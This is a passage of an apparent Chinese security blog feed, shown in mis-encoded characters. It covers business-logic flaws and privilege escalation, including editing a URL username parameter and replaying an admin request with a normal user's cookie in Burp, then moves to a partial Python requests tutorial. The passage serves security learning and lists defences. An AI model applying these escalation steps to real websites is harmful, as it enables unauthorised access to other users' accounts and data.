¼å¼ã€‚</li><li>php.inié…ç½®æ–‡ä»¶ä¸­å¯¹äºopen_basedirè¿›è¡Œé…ç½®ï¼Œé™å®šç”¨æˆ·çš„æ–‡ä»¶è®¿é—®èŒƒå›´ã€‚</li></ul><h4 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h4><p>æ–‡ä»¶ä¸‹è½½æ¼æ´æ¯”è¾ƒç®€å•ï¼Œå®ä¾‹åœ¨ä¹Œäº‘ä¸Šå¯ä»¥æ‰¾åˆ°å¾ˆå¤šï¼Œè¿˜æ˜¯è¦å¤šå¤šå®æˆ˜ğŸ˜ğŸ˜ğŸ˜</p><p>å‚è€ƒï¼š<a href="https://www.bugbank.cn/q/article/598281f5f13c30ea584837f5.html">æ–‡ä»¶ä¸‹è½½</a></p><p><a href="https://www.cnblogs.com/zzhoo/p/12613815.html">ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>é€»è¾‘æ¼æ´||è¶Šæƒ</title>
    <link href="/2021/02/19/1/"/>
    <url>/2021/02/19/1/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¦‚è¿°"><a class="header-anchor" href="#æ¦‚è¿°">ğŸ­</a>æ¦‚è¿°</h4><p>é€»è¾‘é”™è¯¯æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥æˆ–é€»è¾‘å¤ªå¤æ‚ï¼Œå¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯ä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œä¸€èˆ¬å‡ºç°åœ¨ä»»æ„å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ã€‚</p><h4 id="æœ¬è´¨"><a class="header-anchor" href="#æœ¬è´¨">ğŸ­</a>æœ¬è´¨</h4><p>è®¾è®¡è€…æˆ–å¼€å‘è€…åœ¨æ€è€ƒè¿‡ç¨‹ä¸­åšå‡ºçš„ç‰¹æ®Šå‡è®¾å­˜åœ¨æ˜æ˜¾æˆ–éšå«çš„é”™è¯¯</p><h4 id="ç‰¹ç‚¹"><a class="header-anchor" href="#ç‰¹ç‚¹">ğŸ­</a>ç‰¹ç‚¹</h4><ul><li>æ™®éå­˜åœ¨ï¼šæ™®éå­˜åœ¨äºå„ç±»åº”ç”¨ç¨‹åº</li><li>ä¸å›ºå®šï¼šåº”ç”¨ä¸­ä¸åŒåŠŸèƒ½é€»è¾‘ä¸åŒï¼Œæ— æ³•ç”¨ä¸€èˆ¬å·¥å…·å‘ç°</li><li>éšè”½æ€§</li><li>é€»è¾‘æ¼æ´æ˜¯ç›®å‰WAFçš„ç›²åŒºï¼ˆæ•…å½“å‰è¾ƒæ˜“æŒ–æ˜ï¼Œä¸‹æ–‡è¯¦è®²æŒ–æ˜æ€è·¯ï¼‰</li></ul><h4 id="å¸¸è§çš„é€»è¾‘æ¼æ´ï¼š"><a class="header-anchor" href="#å¸¸è§çš„é€»è¾‘æ¼æ´ï¼š">ğŸ­</a>å¸¸è§çš„é€»è¾‘æ¼æ´ï¼š</h4><blockquote><p>æ”¯ä»˜è®¢å•ï¼šåœ¨æ”¯ä»˜è®¢å•æ—¶ï¼Œå¯ä»¥ç¯¡æ”¹ä»·æ ¼ä¸ºä»»æ„é‡‘é¢,æˆ–ç¯¡æ”¹è¿è´¹æˆ–å…¶ä»–è´¹ç”¨ä¸ºè´Ÿæ•°ï¼Œå¯¼è‡´æ€»é‡‘é¢é™ä½ã€‚</p><p>é¡ºåºæ‰§è¡Œç¼ºé™·ï¼ˆå¼ºåˆ¶æµè§ˆï¼‰ï¼šæ”»å‡»è€…åœ¨ç½‘è´­çš„è¿‡ç¨‹ä¸­ç»•è¿‡æ”¯ä»˜è¿‡ç¨‹ï¼Œç›´æ¥ä»æ”¾å…¥è´­ç‰©è½¦æ­¥éª¤è¿›å…¥å¡«å†™æ”¶è´§åœ°å€çš„æ­¥éª¤ã€‚</p><p>è¶Šæƒè®¿é—®ï¼šé€šè¿‡è¶Šæƒæ¼æ´è®¿é—®ä»–äººä¿¡æ¯æˆ–è€…æ“çºµä»–äººè´¦å·ã€‚<br>é‡ç½®å¯†ç ï¼šåœ¨é‡ç½®å¯†ç æ—¶ï¼Œå­˜åœ¨å¤šç§é€»è¾‘æ¼æ´ï¼šåˆ©ç”¨sessionè¦†ç›–é‡ç½®å¯†ç ã€çŸ­ä¿¡éªŒè¯ç ç›´æ¥åœ¨è¿”å›çš„æ•°æ®åŒ…ä¸­â€¦â€¦<br>ç«äº‰æ¡ä»¶ï¼šç«äº‰æ¡ä»¶å¸¸è§äºå¤šç§æ”»å‡»åœºæ™¯ä¸­(å¦‚ä¹‹å‰è®²è¿‡çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´),ä¸¾ä¸ªæ —å­ï¼š</p><blockquote><p>è´­ç‰©æ—¶ï¼Œç”¨æˆ·çš„ä½™é¢ä¸º10å…ƒï¼Œå•†å“Açš„ä»·æ ¼ä¸º6å…ƒï¼Œå•†å“Bçš„ä»·æ ¼ä¸º5å…ƒï¼Œå¦‚æœç”¨æˆ·åˆ†åˆ«è´­ä¹°å•†å“Bå’Œå•†å“Cï¼Œä½™é¢ä¸å¤Ÿ.ä½†æ˜¯å¦‚æœç”¨æˆ·ç”¨ç«äº‰æ¡ä»¶ï¼Œä½¿ç”¨å¤šçº¿ç¨‹åŒæ—¶å‘é€è´­ä¹°å•†å“Aå’Œå•†å“Bçš„è¯·æ±‚ï¼Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹å‡ ç§ç»“æœï¼š</p><blockquote><p>æœ‰ä¸€ä»¶å•†å“è´­ä¹°å¤±è´¥<br>å•†å“éƒ½è´­ä¹°æˆåŠŸï¼Œä½†æ˜¯åªæ‰£äº†6å…ƒ<br>å•†å“éƒ½è´­ä¹°æˆåŠŸï¼Œä½†æ˜¯ä½™é¢å˜æˆäº†-1å…ƒ</p></blockquote></blockquote></blockquote><p>è¿™å‡ ç§å¸¸è§çš„é€»è¾‘æ¼æ´åœ¨ä¹Œäº‘ä¸Šå®ä¾‹å¾ˆå¤šï¼Œè¿™é‡Œä¸å±•å¼€è®²ï¼Œä¸»è¦ç ”ç©¶è¶Šæƒã€‚</p><h2 id="è¶Šæƒæ¼æ´"><a class="header-anchor" href="#è¶Šæƒæ¼æ´">ğŸ­</a>è¶Šæƒæ¼æ´</h2><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯ä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æˆåŠŸæ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼Œä¸”Açš„æƒé™å°äºBçš„æƒé™</p><ul><li>æ°´å¹³è¶Šæƒï¼šç›¸åŒçº§åˆ«(æƒé™)çš„ç”¨æˆ·å¯ä»¥è¶Šæƒè®¿é—®ã€ä¿®æ”¹æˆ–è€…åˆ é™¤å…¶ä»–ç”¨æˆ·ä¿¡æ¯çš„éæ³•æ“ä½œ</li><li>å‚ç›´è¶Šæƒï¼šå°±æ˜¯ä¸åŒçº§åˆ«ä¹‹é—´çš„ç”¨æˆ·è¶Šæƒï¼Œæ¯”å¦‚æ™®é€šç”¨æˆ·å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„åŠŸèƒ½ã€‚</li></ul><h4 id="æˆå› "><a class="header-anchor" href="#æˆå› ">ğŸ­</a>æˆå› </h4><p>å¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šã€‚</p><h4 id="å®ä¾‹"><a class="header-anchor" href="#å®ä¾‹">ğŸ­</a>å®ä¾‹</h4><p>æœ¬æ¥è¦ç”¨fiyo-cmsæ¼”ç¤ºçš„ï¼Œç„¶åæ­äº†ä¸¤å¤©ä¹Ÿæ²¡æ­æˆï¼Œä¸€ç›´ç™»ä¸è¿›å»ï¼Œæ‰å‘ä¸­ğŸ˜¡ğŸ˜¡ğŸ˜¡åªèƒ½æ¢ä¸€ä¸ªå¹³å°</p><h5 id="æ°´å¹³è¶Šæƒ"><a class="header-anchor" href="#æ°´å¹³è¶Šæƒ">ğŸ­</a>æ°´å¹³è¶Šæƒ</h5><p>åˆç§°è®¿é—®æ§åˆ¶æ”»å‡»æ¼æ´ï¼Œåº”ç”¨ç¨‹åºåœ¨æ¥æ”¶åˆ°ç”¨æˆ·çš„è¯·æ±‚æ—¶ï¼Œæ²¡æœ‰åˆ¤æ–­æ•°æ®æ‰€å¯¹åº”çš„ç”¨æˆ·ï¼Œæˆ–è€…åœ¨åˆ¤æ–­æ•°æ®çš„ç”¨æˆ·æ—¶æ˜¯é€šè¿‡ä»ç”¨æˆ·è¡¨å•å‚æ•°ä¸­è·å–useridæ¥å®ç°çš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ä¿®æ”¹useridæ¥å®ç°æ°´å¹³è¶Šæƒã€‚</p><img src="/2021/02/19/1/1.jpg" alt="1" style="zoom: 50%;"><p>ç›´æ¥ä¿®æ”¹urlä¸­çš„usernameå‚æ•°å³å¯ç™»å½•å¦ä¸€ä¸ªç”¨æˆ·</p><img src="/2021/02/19/1/2.jpg" alt="2" style="zoom:50%;"><p>æ­¤å¤„åº”è¯¥æ²¡æœ‰æ£€éªŒæœºåˆ¶ï¼ŒæŸ¥çœ‹æºç </p><img src="/2021/02/19/1/3.jpg" alt="3" style="zoom:67%;"><h5 id="å‚ç›´è¶Šæƒ"><a class="header-anchor" href="#å‚ç›´è¶Šæƒ">ğŸ­</a>å‚ç›´è¶Šæƒ</h5><p>åˆç§°åšæƒé™æå‡æ”»å‡»ï¼Œåº”ç”¨æ²¡æœ‰åšç”¨æˆ·æƒé™æ§åˆ¶ï¼Œæˆ–è€…åªæ˜¯åœ¨èœå•ä¸Šåšäº†æƒé™æ§åˆ¶ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·åªè¦çŒœæµ‹åˆ°å…¶ä»–ç®¡ç†é¡µé¢çš„URLï¼Œå°±å¯ä»¥è®¿é—®æˆ–è€…æ§åˆ¶å…¶ä»–è§’è‰²æ‹¥æœ‰çš„æ•°æ®æˆ–è€…é¡µé¢ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚</p><p>å…ˆç™»å½•æ™®é€šç”¨æˆ·</p><p><img src="/2021/02/19/1/4.jpg" alt="4"></p><p>æ™®é€šç”¨æˆ·åªæœ‰æŸ¥çœ‹æƒé™ï¼Œå†ç™»å½•ç®¡ç†å‘˜</p><p><img src="/2021/02/19/1/5.jpg" alt="5"></p><p>å‘ç°ç®¡ç†å‘˜å¯å¢åˆ ç”¨æˆ·ï¼Œéšä¾¿æ·»åŠ ä¸€ä¸ªåä¸º1çš„ç”¨æˆ·ï¼ŒæŠ“åŒ…</p><p><img src="/2021/02/19/1/6.jpg" alt="6"></p><p>å‘é€è‡³repeaterï¼Œå†ç™»å½•æ™®é€šç”¨æˆ·å¹¶æŠ“åŒ…ï¼Œå°†æ™®é€šç”¨æˆ·çš„cookieæ›¿æ¢æ‰åˆšåˆšrepeateré‡Œçš„ï¼Œæ‰§è¡Œå³å¯åˆ›å»ºä¸€ä¸ªä¸€æ ·çš„ç”¨æˆ·</p><p><img src="/2021/02/19/1/7.jpg" alt="7"></p><p>è¶ŠæƒæˆåŠŸï¼Œæºç ï¼š</p><p><img src="/2021/02/19/1/8.jpg" alt="8"></p><h5 id="é˜²å¾¡"><a class="header-anchor" href="#é˜²å¾¡">ğŸ­</a>é˜²å¾¡</h5><ul><li>ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ</li><li>ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™</li><li>ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­</li></ul><h2 id="é€»è¾‘æ¼æ´çš„æŒ–æ˜"><a class="header-anchor" href="#é€»è¾‘æ¼æ´çš„æŒ–æ˜">ğŸ­</a>é€»è¾‘æ¼æ´çš„æŒ–æ˜</h2><h4 id="åº”ç”¨ç¨‹åºè§£æ"><a class="header-anchor" href="#åº”ç”¨ç¨‹åºè§£æ">ğŸ­</a>åº”ç”¨ç¨‹åºè§£æ</h4><ul><li><p>äº†è§£ç¨‹åºåŠŸèƒ½</p><p>æœ€åŸºæœ¬çš„è‚¯å®šæ˜¯æµè§ˆä¸€ä¸‹æ•´ä¸ªç½‘ç«™ï¼Œå¯é€šè¿‡ç½‘ç«™åœ°å›¾äº†è§£åŸºæœ¬åŠŸèƒ½</p></li><li><p>å¯»æ‰¾æ•°æ®è¾“å…¥ç‚¹</p><p>å¯»æ‰¾å„ç§<em>å¯ç¼–è¾‘çš„ï¼Œä¸å¯ç¼–è¾‘çš„ï¼Œéšè—çš„</em>è¾“å…¥æ¡†æˆ–æŒ‰é’®ï¼Œå…³æ³¨urlåœ°å€ï¼Œå‚æ•°ä¿¡æ¯åŠHTTPå¤´</p></li><li><p>ç¡®è®¤ä¸šåŠ¡æµç¨‹</p><p>å¯ä»¥æ³¨å†Œä¸€ä¸ªæµ‹è¯•è´¦å·ï¼Œç…§ç¨‹åºæ­£å¸¸çš„æµç¨‹èµ°ä¸€éï¼Œåœ¨æ“ä½œçš„åŒæ—¶ï¼ŒæŠŠæ‰€æœ‰æ“ä½œæ­¥éª¤çš„æ•°æ®åŒ…æ‹¦æˆªä¸‹æ¥åˆ†ææµç¨‹æ­¥éª¤æ¶‰åŠåˆ°çš„æ‰€æœ‰æ•°æ®æ“ä½œä»¥åŠæ•°æ®ä¼ è¾“ã€‚ä¸€èˆ¬ä¼šæœ‰æ“ä½œæ­¥éª¤æç¤ºï¼Œäº†è§£åˆ°æ“ä½œæµç¨‹åï¼Œä¹Ÿå°±å¯çŒœæµ‹å‡ºå¯èƒ½å­˜åœ¨å“ªä¸ªæ–¹é¢çš„é€»è¾‘æ¼æ´</p></li></ul><h4 id="æŒ–æ˜æ–¹æ³•"><a class="header-anchor" href="#æŒ–æ˜æ–¹æ³•">ğŸ­</a>æŒ–æ˜æ–¹æ³•</h4><ul><li>ç¡®å®šå®¢æˆ·ç«¯æŠ€æœ¯ï¼Œå¦‚è¡¨å•æ ¡éªŒå½¢å¼(å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯æ ¡éªŒ)ã€è„šæœ¬ç±»å‹ã€cookieè§„åˆ™ã€Javaï¼Œappletã€ActiveXæ§ä»¶ä¸Flashå¯¹è±¡ã€‚</li><li>ç¡®å®šæœåŠ¡å™¨ç«¯æŠ€æœ¯ï¼Œå¦‚è„šæœ¬è¯­è¨€(PHPã€JSPã€ASPç­‰)ã€åº”ç”¨ç¨‹åºå¹³å°ã€æ•°æ®åº“ç±»å‹åŠç”µå­é‚®ä»¶ç­‰äº¤äº’ç³»ç»Ÿã€‚</li><li>æ£€æŸ¥åº”ç”¨ç¨‹åºå“åº”ä¸­çš„HTTPæ¶ˆæ¯å¤´ï¼Œå¦‚Serverã€Refererç­‰ã€‚ä¸€è¿è¡Œæ‰«æå·¥å…·å¯¹æœåŠ¡å™¨åšâ€œæŒ‡çº¹è¯†åˆ«â€ã€‚</li><li>åˆ†ææ‰€è·å¾—ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ‰©å±•åã€ç›®å½•åˆ—è¡¨æˆ–URLè§„å¾‹ã€‚æ£€æŸ¥æ‰€æœ‰ä¼šè¯ä»¤ç‰Œå’Œå…¶ä»–cookieåç§°ç­‰ã€‚</li><li>è·å–åˆ†æç¬¬ä¸‰æ–¹ä»£ç ç»„ä»¶çš„è„šæœ¬ã€å‚æ•°åŠè¡Œä¸ºç­‰ï¼Œå‘ç°åº”ç”¨ç¨‹åº</li></ul><h4 id="æµ‹è¯•é¡¹"><a class="header-anchor" href="#æµ‹è¯•é¡¹">ğŸ­</a>æµ‹è¯•é¡¹</h4><blockquote><p>å®¢æˆ·ç«¯è¾“å…¥éªŒè¯</p><p>å®¢æˆ·ç«¯æ•°æ®ä¼ è¾“</p><p>å®¢æˆ·ç«¯ç»„ä»¶é€»è¾‘</p><p>å¤šé˜¶æ®µè¿‡ç¨‹é€»è¾‘</p><p>ä¸å®Œæ•´è¾“å…¥å¤„ç†</p><p>ä¿¡ä»»è¾¹ç•Œ</p><p>ä¸€äº†è§£åº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç†ä¸åŒç”¨æˆ·ä¿¡ä»»çŠ¶æ€ä¹‹é—´çš„è½¬æ¢ã€‚<br>ä¸€é€šè¿‡åœ¨ä¸€ä¸ªåŒºåŸŸç§¯ç´¯ç›¸å…³çŠ¶æ€ï¼Œåœ¨ä¿¡ä»»è¾¹ç•Œä¹‹é—´è¿›è¡Œä¸æ°å½“çš„è½¬æ¢ï¼Œç„¶åä»¥æ­£å¸¸ä¸è¢«å…è®¸çš„æ–¹å¼åˆ‡æ¢åˆ°å¦ä¸€ä¸ªåŒºåŸŸã€‚<br>ä¸€ç¡®å®šæ˜¯å¦å¯ä»¥åˆ©ç”¨æ›´é«˜æƒé™çš„åŠŸèƒ½ç›´æ¥æˆ–é—´æ¥è®¿é—®æˆ–è€…çŒœæµ‹æŸäº›ä¿¡æ¯ã€‚</p><p>ä¸šåŠ¡é€»è¾‘</p></blockquote><h2 id="é€»è¾‘æ¼æ´çš„é˜²å¾¡"><a class="header-anchor" href="#é€»è¾‘æ¼æ´çš„é˜²å¾¡">ğŸ­</a>é€»è¾‘æ¼æ´çš„é˜²å¾¡</h2><p>é‰´äºé€»è¾‘æ¼æ´çš„æœ¬è´¨ï¼Œå³ä½¿å®æ–½å®‰å…¨å¼€å‘æ ‡å‡†ã€ä½¿ç”¨ä»£ç å®¡æŸ¥å·¥å…·æˆ–å¸¸è§„æ¸—é€æµ‹è¯•ï¼Œä»ç„¶æ— æ³•é¿å…è¿™ç§ç¼ºé™·ã€‚</p><p>åªèƒ½ä»ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢è¿›è¡Œæ€è€ƒ</p><ul><li>å¼€å‘æµç¨‹åŠè®¾è®¡çš„é¢„é˜²</li><li>ç½‘ç»œè¡Œä¸ºè¯†åˆ«çš„é˜²å¾¡</li></ul><h4 id="Tipsï¼šBLA"><a class="header-anchor" href="#Tipsï¼šBLA">ğŸ­</a>Tipsï¼šBLA</h4><p>å•†ä¸šé€»è¾‘æ¼æ´ï¼Œå½“å‰åº”ç”¨é€»è¾‘æ”»å‡»å‘å±•å‡ºæ¥çš„æ–°å‹æ”»å‡»æ–¹å¼ã€‚</p><h5 id="æ”»å‡»æ‰‹æ®µ"><a class="header-anchor" href="#æ”»å‡»æ‰‹æ®µ">ğŸ­</a>æ”»å‡»æ‰‹æ®µ</h5><ul><li>ç”µå­é‚®ä»¶æå–ï¼šé€šè¿‡ç”µå­é‚®ä»¶åœ°å€æŠ½å–å®ç°çš„æ”»å‡»ï¼Œæ¨¡æ‹ŸçœŸå®ç”¨æˆ·è®¿é—®å®¢æˆ·ç½‘ç«™(è®ºå›ã€åšå®¢ã€ç¤¾äº¤ç½‘ç»œâ€¦â€¦)ï¼Œå¯¹å®¢æˆ· Web ç½‘ç«™ä¸­çš„ç”µå­é‚®ä»¶åœ°å€è¿›è¡Œç®€å•æŠ½å–å’Œåˆ†ç±»ã€‚</li><li>åƒåœ¾è¯„è®ºï¼šæ”»å‡»è€…ä¼šåœ¨æŸäº›æ’åé å‰çš„è®ºå›æ³¨å†Œï¼Œå‘è¡¨ã€å›å¤æŸäº›è¨€è®ºï¼Œå†…åµŒæ¶æ„é“¾æ¥åœ°å€æ¥æ”¹å˜æœç´¢å¼•æ“ç»“å·¢ã€‚ä¸ºäº†è®©æ‰€å‘å¸–å­å¤„äºæ˜¾è‘—ä½ç½®è¢«æ›´å¤šç½‘å‹çœ‹åˆ°ï¼Œæ¶æ„æ”»å‡»è€…ä¼šå‘èµ·æŠ•ç¥¨ï¼Œæˆ–æƒ³åŠæ³•è®¾ç½®æˆç½®é¡¶å¸–ã€‚</li></ul><h5 id="æ”»å‡»ç›®çš„"><a class="header-anchor" href="#æ”»å‡»ç›®çš„">ğŸ­</a>æ”»å‡»ç›®çš„</h5><p>ç”µå­é‚®ä»¶æå–ï¼šå»ºç«‹åƒåœ¾é‚®ä»¶å‘é€åˆ—è¡¨ã€‚</p><p>åƒåœ¾è¯„è®ºï¼šä¸€æ–¹é¢å¯¼å…¥æµé‡ï¼Œä½¿å¾—å…¶è·ç›Šçš„ç½‘ç«™åœ¨æœç´¢å¼•æ“çš„æ’åé å‰ï¼Œä¸€æ–¹é¢è®©æœç´¢å¼•æ“æ›´å¤šæœåˆ°è·ç›Šç½‘ç«™ï¼Œä»è€Œè¯ˆéª—æ½œåœ¨æ¶ˆè´¹è€…</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>é€»è¾‘æ¼æ´åœ¨WAFç›²åŒºï¼Œè¾ƒéš¾é˜²å¾¡ï¼Œä¹Ÿè¾ƒæ˜“æŒ–æ˜ï¼Œåˆæ¯”è¾ƒè´´åˆ‡ç”Ÿæ´»ï¼Œå­¦ä¹ æ­¤æ¼æ´è¿˜æ˜¯è¦å¤šä»¥å®ä¾‹ä¸ºä¸»:ğŸ‘ğŸ‘ğŸ‘</p><p>å‚è€ƒï¼šç™¾åº¦æ–‡åº“<a href="https://wenku.baidu.com/view/861838842dc58bd63186bceb19e8b8f67c1cefe3.html">é€»è¾‘æ¼æ´</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python Libraryâ€”â€”bs4&amp;requests</title>
    <link href="/2021/02/19/Soup4/"/>
    <url>/2021/02/19/Soup4/</url>
    
    <content type="html"><![CDATA[<h2 id="requestsåº“"><a class="header-anchor" href="#requestsåº“">ğŸ­</a>requestsåº“</h2><h4 id="å¯¼å…¥-Requests-æ¨¡å—ï¼š"><a class="header-anchor" href="#å¯¼å…¥-Requests-æ¨¡å—ï¼š">ğŸ­</a>å¯¼å…¥ Requests æ¨¡å—ï¼š</h4><pre><code class="hljs elm"><span class="hljs-keyword">import</span> requests</code></pre><h4 id="è·å–æŸä¸ªç½‘é¡µ"><a class="header-anchor" href="#è·å–æŸä¸ªç½‘é¡µ">ğŸ­</a>è·å–æŸä¸ªç½‘é¡µ</h4><pre><code class="hljs kotlin">r = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<span class="hljs-comment">//getè¯·æ±‚</span>r = requests.post(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)<span class="hljs-comment">//postè¯·æ±‚</span>PUTä¸postæ ¼å¼ä¸€æ ·ï¼ŒDELETEï¼ŒHEAD ï¼ŒOPTIONSä¸<span class="hljs-keyword">get</span>æ ¼å¼ä¸€æ ·</code></pre><h4 id="ä¼ é€’-URL-å‚æ•°"><a class="header-anchor" href="#ä¼ é€’-URL-å‚æ•°">ğŸ­</a>ä¼ é€’ URL å‚æ•°</h4><p>ä½¿ç”¨ <code>params</code> å…³é”®å­—å‚æ•°ï¼Œä»¥ä¸€ä¸ªå­—ç¬¦ä¸²å­—å…¸æä¾›å‚æ•°ã€‚</p><p>ä¼ é€’<code>key1=value1</code> å’Œ <code>key2=value2</code> åˆ° <code>url</code>ï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<span class="hljs-attr">r</span> = requests.get(<span class="hljs-string">&quot;url&quot;</span>, params=payload)</code></pre><p>ä¹Ÿå¯ä»¥å°†ä¸€ä¸ªåˆ—è¡¨ä½œä¸ºå€¼ä¼ å…¥</p><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: [<span class="hljs-string">&#x27;value2&#x27;</span>, <span class="hljs-string">&#x27;value3&#x27;</span>]&#125;</code></pre><h4 id="å“åº”å†…å®¹"><a class="header-anchor" href="#å“åº”å†…å®¹">ğŸ­</a>å“åº”å†…å®¹</h4><pre><code class="hljs awk">r.textr.json<span class="hljs-regexp">//</span>jsonç¼–ç r.raw<span class="hljs-regexp">//</span>è®¿é—®åŸå§‹ç›¸åº”å†…å®¹ï¼ˆstream=Trueï¼‰r.status_code<span class="hljs-regexp">//</span>æ£€æµ‹ååº”çŠ¶æ€ç r.headers<span class="hljs-regexp">//</span>è®¿é—®æœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬çš„å“åº”å¤´éƒ¨ä¿¡æ¯</code></pre><p>Requests ä¼šè‡ªåŠ¨è§£ç æ¥è‡ªæœåŠ¡å™¨çš„å†…å®¹ï¼Œç¼–ç æ–¹å¼é€šæ˜¯è¿‡HTTP å¤´éƒ¨æ¨æµ‹è€Œå‡ºï¼Œå¯ä»¥ç”¨<code>r.encoding</code>æŸ¥çœ‹å¹¶æ›´æ”¹ã€‚</p><p>response.textè¿”å›çš„æ˜¯Unicodeå‹çš„æ•°æ®ã€‚â€”æ–‡æœ¬</p><p>response.contentè¿”å›çš„æ˜¯byteså‹ä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶çš„æ•°æ®ã€‚-----å›¾ç‰‡ç­‰</p><p>ä½†æ˜¯ä¸¤è€…æ‰“å°è¾“å‡ºæ˜¯ä¸€æ ·çš„</p><h4 id="å®šåˆ¶è¯·æ±‚å¤´"><a class="header-anchor" href="#å®šåˆ¶è¯·æ±‚å¤´">ğŸ­</a>å®šåˆ¶è¯·æ±‚å¤´</h4><p>ä¼ é€’ä¸€ä¸ª dict ç»™ headers å‚æ•°ï¼š</p><pre><code class="hljs nix"><span class="hljs-built_in">import</span> requests<span class="hljs-attr">new_headers</span> = &#123;    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&quot;</span>&#125;<span class="hljs-attr">response</span> = requests.get(<span class="hljs-string">&quot;url&quot;</span>,<span class="hljs-attr">headers</span> = new_headers)print(response.text)        <span class="hljs-comment">#æ­£å¸¸è¾“å‡º</span></code></pre><h4 id="å†…ç½®çš„çŠ¶æ€ç æŸ¥è¯¢å¯¹è±¡"><a class="header-anchor" href="#å†…ç½®çš„çŠ¶æ€ç æŸ¥è¯¢å¯¹è±¡">ğŸ­</a>å†…ç½®çš„çŠ¶æ€ç æŸ¥è¯¢å¯¹è±¡</h4><pre><code class="hljs http"><span class="hljs-attribute">100</span>: (&#x27;continue&#x27;,),<span class="hljs-attribute">101</span>: (&#x27;switching_protocols&#x27;,),<span class="hljs-attribute">102</span>: (&#x27;processing&#x27;,),<span class="hljs-attribute">103</span>: (&#x27;checkpoint&#x27;,),<span class="hljs-attribute">122</span>: (&#x27;uri_too_long&#x27;, &#x27;request_uri_too_long&#x27;),<span class="hljs-attribute">200</span>: (&#x27;ok&#x27;, &#x27;okay&#x27;, &#x27;all_ok&#x27;, &#x27;all_okay&#x27;, &#x27;all_good&#x27;, &#x27;\o/&#x27;, &#x27;âœ“&#x27;),<span class="hljs-attribute">201</span>: (&#x27;created&#x27;,),<span class="hljs-attribute">202</span>: (&#x27;accepted&#x27;,),<span class="hljs-attribute">203</span>: (&#x27;non_authoritative_info&#x27;, &#x27;non_authoritative_information&#x27;),<span class="hljs-attribute">204</span>: (&#x27;no_content&#x27;,),<span class="hljs-attribute">205</span>: (&#x27;reset_content&#x27;, &#x27;reset&#x27;),<span class="hljs-attribute">206</span>: (&#x27;partial_content&#x27;, &#x27;partial&#x27;),<span class="hljs-attribute">207</span>: (&#x27;multi_status&#x27;, &#x27;multiple_status&#x27;, &#x27;multi_stati&#x27;, &#x27;multiple_stati&#x27;),<span class="hljs-attribute">208</span>: (&#x27;already_reported&#x27;,),<span class="hljs-attribute">226</span>: (&#x27;im_used&#x27;,),<span class="hljs-attribute">Redirection.</span><span class="hljs-attribute">300</span>: (&#x27;multiple_choices&#x27;,),<span class="hljs-attribute">301</span>: (&#x27;moved_permanently&#x27;, &#x27;moved&#x27;, &#x27;\o-&#x27;),<span class="hljs-attribute">302</span>: (&#x27;found&#x27;,),<span class="hljs-attribute">303</span>: (&#x27;see_other&#x27;, &#x27;other&#x27;),<span class="hljs-attribute">304</span>: (&#x27;not_modified&#x27;,),<span class="hljs-attribute">305</span>: (&#x27;use_proxy&#x27;,),<span class="hljs-attribute">306</span>: (&#x27;switch_proxy&#x27;,),<span class="hljs-attribute">307</span>: (&#x27;temporary_redirect&#x27;, &#x27;temporary_moved&#x27;, &#x27;temporary&#x27;),<span class="hljs-attribute">308</span>: (&#x27;permanent_redirect&#x27;,&#x27;resume_incomplete&#x27;, 